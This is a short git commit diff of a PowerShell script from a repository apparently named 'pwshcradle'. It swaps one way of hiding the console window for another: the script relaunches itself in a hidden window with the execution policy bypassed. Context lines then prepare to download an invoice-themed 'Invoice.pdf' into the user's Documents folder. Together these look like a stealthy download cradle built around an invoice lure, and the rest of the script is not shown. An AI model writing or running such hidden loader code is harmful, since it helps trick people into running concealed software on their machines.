673f3ed6adeea556a2db05dfe226890af7923ec5
Brothersextremegaming <125992368+Brothersextremegaming@users.noreply.github.com>
2026-02-24 11:13:23 +0530

    11:13

--- final.ps1
+++ final.ps1
@@ -1,10 +1,8 @@
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'
-[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0) | Out-Null
+if (-not $env:RELAUNCHED) {
+    $env:RELAUNCHED = "1"
+    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -ErrorAction SilentlyContinue
+    exit
+}
 
 $pdfUrl  = "https://raw.githubusercontent.com/Brothersextremegaming/pwshcradle/refs/heads/main/Invoice.pdf"
 $pdfPath = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "file.pdf"
